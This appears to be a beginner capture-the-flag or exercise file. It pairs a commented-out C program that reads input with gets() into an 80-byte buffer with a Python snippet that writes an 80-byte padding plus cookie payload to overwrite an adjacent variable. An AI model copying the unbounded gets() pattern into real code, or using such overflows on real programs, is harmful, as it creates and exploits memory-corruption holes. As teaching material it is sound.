##include <stdio.h>
#
#int
#main(int argc, char*argv[]){
#    int cookie=0;
#    char buf[80];
#
#    gets(buf);
#
#    if (cookie == 0x41424344)
#        printf("YOU WIN!\n");
#return 0;
#}

with open('./01-challenge.win','wb') as win:
	buffer = '\x00' * 80
	cookie = '\x44\x43\x42\x41'
	win.write(buffer + cookie)

